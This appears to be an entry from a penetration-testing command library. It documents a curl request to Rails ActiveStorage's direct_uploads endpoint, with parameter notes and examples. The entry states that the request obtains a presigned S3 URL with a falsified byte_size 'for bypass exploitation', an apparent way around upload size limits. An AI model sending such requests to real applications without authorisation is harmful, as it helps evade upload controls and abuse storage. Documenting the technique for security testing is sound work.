---
id: cmd-uuid-1
data: >-
  curl -X POST https://target-app/rails/active_storage/direct_uploads -H
  "Content-Type: application/json" -H "X-CSRF-Token: TOKEN_IF_NEEDED" -d
  '{"filename":"test.txt","content_type":"text/plain","byte_size":10485760,"checksum":"DUMMY_MD5_BASE64"}'
tags:
  - http
  - post
  - rails
type: command
output: '{"signed_id":"...","direct_upload":{"url":"https://s3...","headers":{...}}}'
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T05:32:10.035Z'
verified: false
validated: true
submitted: true
---
# curl-create-presigned-url

## Command

```bash
curl -X POST https://target-app/rails/active_storage/direct_uploads -H "Content-Type: application/json" -H "X-CSRF-Token: TOKEN_IF_NEEDED" -d '{"filename":"test.txt","content_type":"text/plain","byte_size":10485760,"checksum":"DUMMY_MD5_BASE64"}'
```

## Description

Sends a POST request to Rails ActiveStorage DirectUploadsController to create a presigned S3 URL with falsified byte_size for bypass exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method for creating upload | Yes |
| `-H "Content-Type: application/json"` | Sets JSON payload | Yes |
| `-H "X-CSRF-Token: TOKEN_IF_NEEDED"` | CSRF protection if enabled | Conditional |
| `-d '{...}'` | JSON with filename, content_type, byte_size (small), checksum | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://example.com/rails/active_storage/direct_uploads -H "Content-Type: application/json" -d '{"filename":"test.txt","byte_size":10000,"checksum":"abc123=="}'
```

### Advanced Usage

```bash
curl -X POST https://example.com/rails/active_storage/direct_uploads -H "Content-Type: application/json" -H "Cookie: session=abc" -d '{"filename":"large.txt","content_type":"application/octet-stream","byte_size":10485760,"checksum":"MD5_BASE64"}'
```

## Expected Output

JSON response with presigned URL: {"direct_upload":{"url":"https://s3.amazonaws.com/..."}}

## Related

- [[Related Procedure]]
